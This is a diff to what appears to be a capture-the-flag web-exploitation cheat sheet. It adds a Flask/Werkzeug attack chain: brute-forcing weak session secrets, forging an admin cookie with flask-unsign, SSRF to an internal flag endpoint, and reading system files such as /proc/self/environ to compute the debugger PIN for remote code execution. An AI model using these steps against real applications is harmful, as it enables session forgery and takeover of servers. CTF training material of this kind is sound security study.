@@ -177,6 +177,33 @@ hashcat -m 16500 jwt.txt wordlist.txt        # JWT crack
 dalfox url http://target/?q=test             # XSS
 ```
 
+## Flask/Werkzeug Debug Mode Exploitation
+
+**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.
+
+**Attack chain:**
+1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
+   ```bash
+   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
+   # Or brute-force programmatically:
+   for word in wordlist:
+       try:
+           data = decode_flask_cookie(cookie, word)
+           print(f"Secret: {word}, Data: {data}")
+       except: pass
+   ```
+2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
+   ```bash
+   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
+   ```
+3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
+4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request
+
+**Werkzeug debugger RCE:** If `/console` is accessible, generate PIN:
+- Read `/proc/self/environ`, `/sys/class/net/eth0/address`, `/proc/sys/kernel/random/boot_id`
+- Compute PIN using Werkzeug's algorithm
+- Execute arbitrary Python in debugger console
+
 ## Common Flag Locations
 
 ```
